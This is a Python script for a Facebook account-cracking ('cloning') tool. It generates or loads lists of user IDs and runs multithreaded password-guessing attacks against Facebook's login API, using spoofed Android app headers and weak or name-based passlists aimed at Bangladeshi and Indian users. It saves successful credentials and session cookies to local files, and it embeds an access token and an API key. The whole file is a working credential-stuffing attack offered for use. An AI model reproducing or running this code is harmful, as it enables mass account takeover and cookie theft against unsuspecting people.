import os
import random
import time
import string
import sys
import uuid
import json
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from os import system

# ----- Color Constants -----
G = "\033[1;92m"  # Green
W = "\x1b[38;5;15m"  # White
B = "\033[1;34m"  # Blue
Y = "\x1b[38;5;226m"  # Yellow
R = "\33[1;91m"   # Red
X = "\x1b[38;5;205m"  # Pink
P = "\x1b[10;95m"     # Purple

# ----- UI Elements -----
vb = f"{W}>{G}×{W}<"
vb1 = f"{W}>{G}1{W}<"
vb2 = f"{W}>{G}2{W}<"
vb3 = f"{W}>{G}3{W}<"
vb0 = f"{W}>{G}0{W}<"
vbv = f"{W}>{G}?{W}<"
vcv = f"{W}>{G}>{W}>"

# ----- Banner -----
LOGO = f"""
{G}⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
{G}⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
{G}⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
{G}⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
{G}⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
{G}⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
{G}⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
{G}⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
{G}⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
{G}⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{vb} DEVELOPER {vcv} K14M-69
{vb} FEATURES {vcv} RANDOM{G}〤{W}FILE{G}〤{W}OLD
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

# ----- Constants -----
ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
SIM_EXAMPLE = f"{vb} EXAMPLE   {vcv} 016 {G}/{W} 017 {G}/{W} 018 {G}/{W} 019"
LIMIT_EXAMPLE = f"{vb} EXAMPLE   {vcv} 6666 {G}/{W} 7777 {G}/{W} 8888 {G}/{W} 9999"
METHOD_OPTIONS = f"{vb1} METHOD {W}/{G}1-GRAPH{W}/\n{vb2} METHOD {W}/{G}2-API{W}/"
METHOD_RANDOM = f"{vb1} METHOD {W}/{G}1-GRAPH{W}/\n{vb2} METHOD {W}/{G}2-B-GRAPH{W}/"
BANGLADESH_PASS = ["first2025", "first123", "first@12345", "000999", "@first@", 
                  "firstlast1234", "first321", "firstlast", "first", "first12",
                  "firstlast123", "123412", "0987654", "@1234@", "09876543"]
INDIA_PASS = ['57273200', '59039200', '57575751', '07860786']
OLD_PASS = ["123456", "1234567", "12345678", "123456789", "123123", "143143"]
USER_AGENTS = [
    "[FBAN/FB4A;FBAV/388.0.0.32.105;FBBV/317616396;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817218;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/FBCR/Robi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/315414711;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
]

# ----- Helper Functions -----
def clear_screen():
    system("clear")
    print(LOGO)

def print_line():
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def generate_user_agent():
    return random.choice(USER_AGENTS)

def generate_old_user_agent():
    win_major = random.choice([10, 11])
    chrome_major = random.choice(range(120, 123))
    chrome_build = random.choice(range(0, 6000))
    chrome_patch = random.choice(range(0, 200))
    return (f"Mozilla/5.0 (Windows NT {win_major}.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36")

# ----- Main Class -----
class FacebookCloner:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
        self.plist = []
        self.access_token = ACCESS_TOKEN

    def main_menu(self):
        clear_screen()
        print(f"{vb1} RANDOM CLONING  | {vb3} OLD CLONING")
        print(f"{vb2} FILE CLONING    | {vb0} EXIT TOOLS ")
        print_line()
        
        choice = input(f"{vbv} INPUT MENU {vcv} ")
        if choice == "1":
            self.random_cloning()
        elif choice == "2":
            self.file_cloning()
        elif choice == "3":
            self.old_cloning()
        elif choice == "0":
            self.exit_tool()
        else:
            self.invalid_option()

    def exit_tool(self):
        print_line()
        print(f"{vb} SUCCESSFULLY EXIT DONE.....!")
        sys.exit()

    def invalid_option(self):
        print_line()
        print(f"{vb} INVALID OPTION TRY AGAIN......!")
        time.sleep(1.5)
        self.main_menu()

    def file_not_found(self):
        print_line()
        print(f"{R} FILE NOT FOUND! PLEASE CHECK PATH")
        time.sleep(2)
        self.file_cloning()

    def update_counter(self):
        self.loop += 1
        print(f"\r\r{vb} K14M69-OK {G}{len(self.oks)}{W} - K14M69-CP {Y}{len(self.cps)}{W} - TOTAL {B}{self.loop}{W}", end="")

    # ----- Cloning Methods -----
    def file_cloning(self):
        clear_screen()
        print(f"{vb} EXAMPLE   {vcv}{G} /{W}sdcard{G}/{W}GIFT{G}.{W}txt ")
        print_line()
        
        file_path = input(f"{vbv} INPUT FILE PATH {vcv} ")
        try:
            with open(file_path, 'r') as f:
                user_data = [line.strip().split('|') for line in f.readlines()]
        except:
            self.file_not_found()
            return

        clear_screen()
        print(METHOD_OPTIONS)
        print_line()
        method = input(f"{vbv} INPUT METHOD {vcv} ")
        
        self.select_passlist()
        
        with ThreadPool(max_workers=30) as executor:
            clear_screen()
            print(f"{vb} TOTAL IDS {vcv} {len(user_data)} ")
            print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
            print_line()
            
            for ids, name in user_data:
                if method == "1":
                    executor.submit(self.method1, ids, name, self.plist)
                elif method == "2":
                    executor.submit(self.method2, ids, name, self.plist)
                else:
                    executor.submit(self.method1, ids, name, self.plist)
        
        self.show_results()

    def random_cloning(self):
        clear_screen()
        print(SIM_EXAMPLE)
        print_line()
        sim_code = input(f"{vbv} INPUT SIM CODE {vcv} ")
        
        clear_screen()
        print(LIMIT_EXAMPLE)
        print_line()
        try:
            limit = int(input(f"{vbv} INPUT LIMIT {vcv} "))
        except:
            limit = 5000
        
        clear_screen()
        print(METHOD_RANDOM)
        print_line()
        method = input(f"{vbv} INPUT METHOD {vcv} ")
        
        self.gen = [sim_code + ''.join(random.choices(string.digits, k=8)) for _ in range(limit)]
        
        with ThreadPool(max_workers=30) as executor:
            clear_screen()
            print(f"{vb} SIM CODE  {vcv} {sim_code} ")
            print(f"{vb} TOTAL IDS {vcv} {limit} ")
            print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
            print_line()
            
            for uid in self.gen:
                passlist = [uid, uid[:8], uid[:7], uid[:6], uid[3:], uid[4:]]
                
                if method == "1":
                    executor.submit(self.method1_random, uid, passlist)
                elif method == "2":
                    executor.submit(self.method2_random, uid, passlist)
                else:
                    executor.submit(self.method1_random, uid, passlist)
        
        self.show_results()

    def old_cloning(self):
        clear_screen()
        print(LIMIT_EXAMPLE)
        print_line()
        try:
            limit = int(input(f"{vbv} INPUT LIMIT {vcv} "))
        except:
            limit = 10000
        
        self.gen = [str(random.randint(1000000000, 1999999999)) for _ in range(limit)]
        
        with ThreadPool(max_workers=30) as executor:
            clear_screen()
            print(f"{vb} TOTAL IDS {vcv} {limit} ")
            print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
            print_line()
            
            for uid in self.gen:
                executor.submit(self.old_method, "10000" + uid)
        
        self.show_results()

    # ----- Password List Selection -----
    def select_passlist(self):
        clear_screen()
        print(f"{vb1} AUTO BANGLADESH PASSLIST ")
        print(f"{vb2} AUTO INDIA PASSLIST ")
        print(f"{vb3} CUSTOM PASSLIST ")
        print_line()
        
        pass_choice = input(f"{vbv} INPUT PASSLIST {vcv} ")
        if pass_choice == "1":
            self.plist = BANGLADESH_PASS
        elif pass_choice == "2":
            self.plist = INDIA_PASS
        else:
            try:
                clear_screen()
                print(f"{vb} BANGLADESH PASSLIST 10{G}/{W}15 LIMIT")
                print(f"{vb} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
                print_line()
                limit = int(input(f"{vbv} PASSWORD LIMIT {vcv} "))
                self.plist = [input(f"{vb} ENTER PASSLIST {G}/{W}{i+1}{G}/ {vcv} ") for i in range(limit)]
            except:
                self.plist = ["123456", "password", "12345678", "qwerty", "123456789"]

    # ----- API Request Methods -----
    def make_request(self, url, data, headers):
        try:
            response = requests.post(url, data=data, headers=headers, timeout=10)
            return response.json()
        except:
            return None

    def process_response(self, response, uid, password, file_prefix):
        if not response:
            return False
            
        if "session_key" in response:
            cookies = ";".join(f"{c['name']}={c['value']}" for c in response.get("session_cookies", []))
            print(f"\r\r{vb}{G}/{W}>{B}K14M69-OK{W}< {vcv}{B} {uid}{G}/{B}{password}")
            print(f"{vb}{G}/{W}>{B}COOKIE-X{W}< {vcv}{P} {cookies}")
            print_line()
            with open(f'/sdcard/GIFT-BY-K14M69-{file_prefix}-OK.txt', 'a') as f:
                f.write(f"{uid}/{password}/{cookies}\n")
            self.oks.append(uid)
            return True
            
        elif response.get('error', {}).get('error_data', {}).get('uid'):
            uid_str = str(response['error']['error_data']['uid'])
            print(f"\r\r{vb}{G}/{W}>{Y}K14M69-CP{W}< {vcv}{Y} {uid_str}{G}/{Y}{password}")
            print_line()
            with open(f'/sdcard/GIFT-BY-K14M69-{file_prefix}-CP.txt', 'a') as f:
                f.write(f"{uid_str}/{password}\n")
            self.cps.append(uid_str)
            return True
            
        return False

    # ----- Cloning Implementation Methods -----
    def method1(self, uid, name, passlist):
        try:
            fn = name.split()[0]
            ln = name.split()[1] if len(name.split()) > 1 else fn
            
            for pw in passlist:
                password = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
                ua = generate_user_agent()
                
                data = {
                    'adid': ''.join(random.choices(string.hexdigits, k=16)),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': uid,
                    'password': password,
                    'access_token': self.access_token,
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                response = self.make_request('https://graph.facebook.com/auth/login', data, headers)
                if self.process_response(response, uid, password, "FILE-M1"):
                    return
                    
            self.update_counter()
        except Exception:
            pass

    def method2(self, uid, name, passlist):
        try:
            fn = name.split()[0]
            ln = name.split()[1] if len(name.split()) > 1 else fn
            
            for pw in passlist:
                password = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
                ua = generate_user_agent()
                
                data = {
                    'adid': ''.join(random.choices(string.hexdigits, k=16)),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': uid,
                    'password': password,
                    'access_token': self.access_token,
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                response = self.make_request('https://b-graph.facebook.com/auth/login', data, headers)
                if self.process_response(response, uid, password, "FILE-M2"):
                    return
                    
            self.update_counter()
        except Exception:
            pass

    def method1_random(self, uid, passlist):
        try:
            for password in passlist:
                ua = generate_user_agent()
                
                data = {
                    'adid': ''.join(random.choices(string.hexdigits, k=16)),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': uid,
                    'password': password,
                    'access_token': self.access_token,
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                response = self.make_request('https://graph.facebook.com/auth/login', data, headers)
                if self.process_response(response, uid, password, "RANDOM-M1"):
                    return
                    
            self.update_counter()
        except Exception:
            pass

    def method2_random(self, uid, passlist):
        try:
            for password in passlist:
                ua = generate_user_agent()
                
                data = {
                    'adid': ''.join(random.choices(string.hexdigits, k=16)),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': uid,
                    'password': password,
                    'access_token': self.access_token,
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                response = self.make_request('https://b-graph.facebook.com/auth/login', data, headers)
                if self.process_response(response, uid, password, "RANDOM-M2"):
                    return
                    
            self.update_counter()
        except Exception:
            pass

    def old_method(self, uid):
        try:
            for password in OLD_PASS:
                ua = generate_old_user_agent()
                
                data = {
                    'adid': ''.join(random.choices(string.hexdigits, k=16)),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': uid,
                    'password': password,
                    'access_token': self.access_token,
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'X-FB-Connection-Type': 'WIFI',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                response = self.make_request('https://graph.facebook.com/auth/login', data, headers)
                if self.process_response(response, uid, password, "OLD-METHOD"):
                    return
                    
            self.update_counter()
        except Exception:
            pass

    # ----- Results Display -----
    def show_results(self):
        print("\033[1;37m")
        print_line()
        print(f"{vb} THE PROCESS HAS COMPLETED...!")
        print(f"{vb} TOTAL OK/CP {vcv}{B}{len(self.oks)}{G}/{Y}{len(self.cps)}")
        print_line()
        print(f"{vb} THANKS FOR USING K14M69 TOOL.....! ")
        time.sleep(3)
        sys.exit()

if __name__ == "__main__":
    try:
        cloner = FacebookCloner()
        cloner.main_menu()
    except KeyboardInterrupt:
        print("\n\nProgram terminated by user")
        sys.exit()